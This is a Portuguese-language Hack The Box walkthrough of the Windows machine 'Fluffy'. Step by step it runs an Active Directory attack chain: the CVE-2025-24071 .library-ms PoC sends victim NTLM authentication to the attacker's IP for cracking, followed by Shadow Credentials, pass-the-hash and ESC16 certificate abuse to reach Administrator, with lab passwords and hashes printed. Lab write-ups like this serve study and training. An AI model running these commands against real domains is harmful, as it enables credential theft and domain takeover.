A Fluffy é uma máquina Windows classificada como Easy. Começo com uma credencial de domínio, consigo a senha de outro usuário por uma falha no Windows Explorer e sigo até o Administrator usando Shadow Credentials e ESC16. No caminho, ainda precisei resolver problemas de horário no Kerberos e de resolução de nomes. Vou mostrar o que fiz, onde travei e como consegui avançar.

Antes de começar

Fiz este walkthrough no laboratório da Hack The Box. Você vai ver IPs diferentes nos comandos e nas imagens (10.129.95.92, 10.129.95.117 e 10.129.99.80), porque tive quedas de VPN e reiniciei a máquina durante a resolução. Use o IP atual da sua instância e atualize o /etc/hosts quando ele mudar. O 10.10.15.225 é o IP da minha VPN: no PoC, substitua pelo seu IP na interface conectada ao lab.

1 · Reconhecimento

A Fluffy começa em um cenário de assumed breach: a HTB fornece a credencial j.fleischman / J0elTHEM4n1990!. Então já tenho um usuário de domínio, mas ainda preciso descobrir o que ele consegue acessar e como sair desse acesso limitado.

Começo pelo Nmap. Faço uma varredura nas portas TCP e depois verifico os serviços e as versões nas portas encontradas:

sudo nmap -p- --min-rate 5000 -Pn 10.129.95.92
sudo nmap -sC -sV -p53,88,139,389,445,464,593,636,3268,3269,5985,9389 10.129.95.92

DNS, Kerberos, LDAP e SMB juntos já apontam para um controlador de domínio. O scan também identifica o domínio fluffy.htb e o host DC01. Adiciono os nomes ao /etc/hosts:

echo '10.129.95.92  dc01.fluffy.htb fluffy.htb dc01' | sudo tee -a /etc/hosts
Por que o /etc/hosts importa

Várias ferramentas de AD precisam resolver o nome do domínio ou do servidor. No Kerberos, os nomes de serviço também fazem parte da autenticação. O /etc/hosts resolve esses nomes localmente, mas não substitui todas as consultas ao DNS do domínio. Se o IP mudar, edite a entrada existente para não deixar o mesmo nome apontando para endereços diferentes.

2 · Enumeração autenticada

Com os nomes resolvendo, testo a credencial do j.fleischman no SMB usando o NetExec (nxc):

nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'

A credencial funciona. Tento então o Kerberoasting: solicitar tickets de serviço de contas com SPN e testar suas senhas offline. Nessa etapa apareceu o erro KRB_AP_ERR_SKEW (Clock skew too great). Depois de conferir a diferença de horário, rodei o comando com faketime:

faketime -f '+7h' nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
O problema de horário no meu lab

O Kerberos depende de relógios próximos entre cliente e DC; a tolerância costuma ser de cerca de cinco minutos. No meu ambiente, o DC estava aproximadamente sete horas à frente do Kali. Conferi o horário com sudo ntpdate -q fluffy.htb. Esse comando consulta o servidor sem ajustar o relógio.

Tentei sincronizar com sudo ntpdate fluffy.htb, mas a sincronização de horário da minha VM no VirtualBox voltava a alterar o relógio. No meu caso, resolvi com o faketime, que ajusta o horário visto pelo processo sem mudar o relógio do sistema.

Por isso os exemplos de Kerberos/PKINIT abaixo usam faketime -f '+7h'. As sete horas são do meu lab: confira a diferença no seu ambiente antes de copiar. Os comandos LDAP que usei com autenticação por senha não precisaram desse ajuste; LDAP também pode usar Kerberos, dependendo da configuração.

Consigo os tickets de ca_svc, ldap_svc e winrm_svc, mas não recupero nenhuma senha com a rockyou. Esse teste não me deu um próximo passo. Então faço uma coleta com o rusthound-ce para analisar as permissões no BloodHound:

./rusthound-ce --domain fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -z

No diretório onde já configurei o BloodHound CE com Docker, inicio os containers. Depois acesso a interface e importo o .zip gerado pelo RustHound. O comando abaixo pressupõe que esse diretório já tenha o arquivo do Docker Compose:

cd ~/bloodhound && docker compose up -d

Não encontro um caminho direto com o j.fleischman. Volto ao SMB e enumero os compartilhamentos para ver o que esse usuário consegue ler ou gravar:

nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares

O compartilhamento IT permite leitura e escrita. Acesso com o smbclient, informo a senha fornecida pela HTB e uso ls para listar os arquivos:

smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT

3 · Obtendo a senha do p.agila

No compartilhamento encontro o Upgrade_Notice.pdf. Baixo com get Upgrade_Notice.pdf no smbclient e leio o documento. Ele lista vulnerabilidades que precisam de atualização, incluindo a CVE-2025-24071. Como tenho escrita nesse share, vou investigar esse caminho.

O que é a CVE-2025-24071

O PoC usa um arquivo .library-ms, que descreve uma biblioteca do Windows. Ao processar esse arquivo no cenário vulnerável, o Explorer acessa um caminho SMB definido no XML. Se o caminho aponta para o meu Kali, consigo receber uma tentativa de autenticação. O repositório apresenta isso como CVE-2025-24071; é essa referência que aparece no aviso e no PoC usados durante a resolução.

Deixo o Responder escutando para capturar essa autenticação. O que ele recebe é uma resposta NetNTLMv2, que posso tentar quebrar offline para descobrir a senha. Isso é diferente de obter o NT hash usado diretamente em pass-the-hash. No lab, o processamento do arquivo no share acabou gerando uma autenticação de outro usuário.

Uso o PoC público do 0x6rss e informo meu IP da VPN. Atenção ao nome: nessa versão, o script sempre cria exploit.zip; a primeira resposta define o nome do .library-ms dentro dele. Renomeio o ZIP para bad.zip, que é o nome usado no upload abaixo:

git clone https://github.com/0x6rss/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC
python3 poc.py
# Enter your file name: bad
# Enter IP (EX: 192.168.1.162): 10.10.15.225
mv exploit.zip bad.zip

No primeiro terminal, inicio o Responder na interface da VPN e deixo rodando. No segundo terminal, a partir da pasta onde está o bad.zip, envio o arquivo para o share IT. Troque tun0 se sua VPN usar outra interface. Depois do upload, recebo a autenticação de p.agila no Responder:

# Terminal 1
sudo responder -I tun0

# Terminal 2
smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT -c 'put bad.zip'

Copio a linha completa da resposta NetNTLMv2 para hash_agila.txt e testo com o Hashcat no modo 5600. O formato é usuário::DOMÍNIO:challenge:NTproof:blob. Aqui consigo recuperar a senha:

hashcat -m 5600 hash_agila.txt /usr/share/wordlists/rockyou.txt
CREDENCIAL OBTIDAp.agila : prometheusx-303

4 · Movimentação lateral — Shadow Credentials

Agora tenho p.agila / prometheusx-303. Marco o usuário como Owned no BloodHound para acompanhar o caminho a partir dele. Essa marcação é só uma ajuda visual; as permissões que permitem avançar são as relações mostradas abaixo:

Lendo as relações em sequência, o caminho fica assim:

p.agila
  └─(membro)→ Service Account Managers
        └─(GenericAll)→ Service Accounts
              └─(GenericWrite)→ winrm_svc / ca_svc / ldap_svc

O p.agila já pertence ao Service Account Managers. Esse grupo tem GenericAll sobre o grupo Service Accounts, então consigo adicionar o próprio p.agila a ele. A partir dessa associação, o usuário passa a ter as permissões de GenericWrite sobre as contas de serviço. Faço a adição com o bloodyAD:

bloodyAD --host 10.129.99.80 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
O que é Shadow Credentials

Nesse ambiente, o GenericWrite me permite alterar o msDS-KeyCredentialLink das contas de serviço. Adiciono uma chave que controlo e uso sua chave privada para autenticar como a conta via PKINIT. Esse é o caminho de Shadow Credentials: não preciso descobrir a senha da conta para conseguir esse acesso.

Uso o certipy shadow auto para automatizar a sequência e recuperar o NT hash. Ao final, a ferramenta tenta restaurar o atributo original; confira essa confirmação na saída. Restaurar o atributo não significa apagar os registros da operação.

faketime -f '+7h' certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.99.80 -ns 127.0.0.1
Como investiguei a resolução de nomes

Nessa etapa recebi No route to host, embora o alvo respondesse e o bloodyAD conseguisse conectar. Ao investigar a resolução de nomes, encontrei um registro AAAA para fluffy.htb, com endereço dead:beef::..., sem rota utilizável na minha VPN. Ter um registro IPv6, por si só, não prova qual endereço a ferramenta escolheu; vale conferir a saída com -debug.

Consultei com dig +short @10.129.99.80 fluffy.htb AAAA. Na versão que usei, o comando funcionou com -ns 127.0.0.1 e o IPv4 correto no /etc/hosts. Mantive essa combinação nos exemplos da minha resolução. O -ns escolhe o servidor DNS: ele não é uma opção para forçar IPv4, e apontar para localhost só faz sentido se você entender como a resolução está funcionando no seu ambiente.

Com o acesso ao winrm_svc resolvido, repito o Shadow Credentials para o ca_svc. Vou usar o hash dessa segunda conta na etapa de certificados:

faketime -f '+7h' certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.99.80 -ns 127.0.0.1

Uso o NT hash do winrm_svc no Evil-WinRM para entrar por pass-the-hash. Com essa sessão, consigo acessar a flag de usuário:

evil-winrm -i 10.129.99.80 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

5 · Escalonamento — AD CS ESC16

O nome da conta ca_svc me dá uma pista para investigar o AD CS; o host continua sendo o DC01. Uso o hash que acabei de obter no certipy find para enumerar a autoridade certificadora e os templates:

certipy find -username ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.99.80 -vulnerable
O que é o ESC16

O Certipy identifica ESC16: a CA não inclui a extensão de segurança que vincula o certificado ao SID da conta.

No lab, combino isso com o controle do UPN do ca_svc e a permissão de solicitar certificados. Esse caminho também depende das regras de mapeamento de certificados do DC; desabilitar a extensão, sozinho, não garante que a mesma sequência funcione em qualquer domínio.

Como reiniciei o lab entre algumas tentativas, precisei adicionar o p.agila novamente ao grupo Service Accounts. Se você também resetou a máquina, confirme essa associação antes de continuar:

bloodyAD --host 10.129.99.80 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila

Antes de mudar qualquer atributo, leio a conta ca_svc e anoto seu userPrincipalName. Vou precisar restaurar esse valor depois de emitir o certificado:

certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.129.99.80 -user ca_svc read

Com a permissão confirmada, altero o UPN do ca_svc para administrator, sem o sufixo do domínio. Nas tentativas anteriores, usar winrm_svc@fluffy.htb resultou em CONSTRAINT_ATT_TYPE, consistente com a restrição a um UPN já em uso. Para o caminho abaixo, sigo com administrator:

certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.129.99.80 -user ca_svc -upn administrator update
Por que o UPN spoofing funciona

A sequência é: mudar o UPN, emitir o certificado e restaurar o UPN antes de autenticar. A requisição continua autenticada como ca_svc; a identidade incorporada no certificado é que permite o abuso nas condições deste lab.

Com o UPN alterado, solicito um certificado pelo template User, autenticando com o hash do ca_svc. Nesse template, a identidade vem dos atributos da conta:

certipy req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -dc-ip 10.129.99.80

Na primeira tentativa, autentiquei antes de restaurar o UPN e recebi name mismatch. O certificado já tinha sido emitido, então mantive o administrator.pfx e restaurei o atributo. Na minha resolução, o valor registrado era ca_svc; use o valor que você anotou na leitura da conta:

certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.129.99.80 -user ca_svc -upn ca_svc update

Com o UPN restaurado, autentico usando o administrator.pfx. Como essa etapa usa PKINIT, mantenho o ajuste de horário do meu ambiente. O Certipy consegue obter o TGT e recuperar o NT hash do Administrator:

faketime -f '+7h' certipy auth -dc-ip 10.129.99.80 -pfx administrator.pfx -username administrator -domain fluffy.htb
DOMAIN ADMIN OBTIDOadministrator : aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

Para conferir essa sequência, consulte a documentação do Certipy sobre ESC16.

6 · Conclusão

Agora uso o hash do Administrator no Evil-WinRM. Com a sessão administrativa, consigo acessar a flag final, root.txt, e concluir a máquina:

evil-winrm -i 10.129.99.80 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

Fluffy feita! Comecei com o j.fleischman, recuperei a senha do p.agila, usei as permissões de grupo para chegar às contas de serviço e terminei como Administrator pelo ESC16. Além da cadeia de ataque, três detalhes fizeram diferença na minha resolução:

  • Horário: confira a diferença para o DC antes de usar Kerberos. O +7h resolveu no meu ambiente; não é um valor fixo da máquina.
  • Resolução de nomes: confira os nomes, os registros DNS e as rotas. O ajuste com -ns que usei foi uma solução para o meu ambiente, não uma opção universal para IPv4.
  • Estado do lab: depois de um reset, confira o IP e as alterações feitas no AD. A associação ao grupo Service Accounts pode precisar ser refeita.

Deixei os conceitos e as ferramentas deste caminho no guia de Active Directory. Se alguma etapa não ficou clara, vale voltar ao conceito e entender qual permissão ou credencial abriu o próximo passo.
